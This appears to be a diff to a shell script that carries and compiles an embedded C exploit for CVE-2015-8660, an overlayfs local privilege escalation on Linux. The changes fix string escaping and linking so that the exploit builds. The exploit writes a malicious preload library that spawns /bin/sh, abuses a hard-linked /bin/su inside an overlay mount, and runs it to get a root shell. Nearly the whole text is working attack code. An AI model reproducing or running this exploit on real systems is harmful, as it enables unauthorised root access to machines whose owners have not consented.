@@ -84,7 +84,7 @@ compile_and_run_exploit() {
 #include <string.h>
 #include <errno.h>
 
-#define LIB "#define _GNU_SOURCE\\n\\n#include <dlfcn.h>\\n#include <stdio.h>\\n#include <stdlib.h>\\n#include <sys/types.h>\\n#include <sys/stat.h>\\n#include <fcntl.h>\\n#include <unistd.h>\\n\\nvoid _init() {\\n\\tunlink(\\\"/etc/ld.so.preload\\\");\\n\\tsystem(\\\"/bin/sh\\\");\\n}\\n"
+#define LIB "#define _GNU_SOURCE\n\n#include <dlfcn.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\n\nvoid _init() {\n\tunlink(\"/etc/ld.so.preload\");\n\tsystem(\"/bin/sh\");\n}\n"
 
 int main(int argc, char *argv[])
 {
@@ -92,7 +92,7 @@ int main(int argc, char *argv[])
   int fdo, fds;
   struct stat st;
 
-  printf("[+] preparing library\\n");
+  printf("[+] preparing library\n");
   fdo = open("/tmp/ofs-lib.c", O_WRONLY|O_CREAT, 0600);
   if (fdo < 0) {
     perror("open");
@@ -101,7 +101,7 @@ int main(int argc, char *argv[])
   write(fdo, LIB, strlen(LIB));
   close(fdo);
 
-  printf("[+] compiling library\\n");
+  printf("[+] compiling library\n");
   system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -nostartfiles");
 
   fdo = open("/proc/self/exe", O_RDONLY);
@@ -115,26 +115,26 @@ int main(int argc, char *argv[])
     exit(1);
   }
 
-  printf("[+] opening lower dir\\n");
+  printf("[+] opening lower dir\n");
   fds = open("/tmp/lower", O_RDONLY|O_DIRECTORY|O_CREAT, 0600);
   if (fds < 0) {
     perror("open");
     exit(1);
   }
 
-  printf("[+] opening upper dir\\n");
+  printf("[+] opening upper dir\n");
   if (mkdir("/tmp/upper", 0600) && errno != EEXIST) {
     perror("mkdir");
     exit(1);
   }
 
-  printf("[+] opening work dir\\n");
+  printf("[+] opening work dir\n");
   if (mkdir("/tmp/work", 0600) && errno != EEXIST) {
     perror("mkdir");
     exit(1);
   }
 
-  printf("[+] opening overlay dir\\n");
+  printf("[+] opening overlay dir\n");
   if (mkdir("/tmp/overlay", 0600) && errno != EEXIST) {
     perror("mkdir");
     exit(1);
@@ -151,7 +151,7 @@ int main(int argc, char *argv[])
     exit(1);
   }
 
-  printf("[+] copying /bin/su\\n");
+  printf("[+] copying /bin/su\n");
   if (link("/bin/su", "/tmp/overlay/su") < 0) {
     perror("link");
     exit(1);
@@ -188,7 +188,7 @@ int main(int argc, char *argv[])
     exit(1);
   }
 
-  printf("[+] executing /bin/su\\n");
+  printf("[+] executing /bin/su\n");
   system("chroot /tmp/overlay /bin/su");
 
   return 0;
@@ -262,7 +262,7 @@ int main(int argc, char *argv[]) {
 }
 EOF
 
-    $COMPILER -o $TMP_DIR/exploit $TMP_DIR/$CVE_2015_8660_SRC
+    $COMPILER -o $TMP_DIR/exploit $TMP_DIR/$CVE_2015_8660_SRC -lpthread
     $TMP_DIR/exploit
   fi
 }
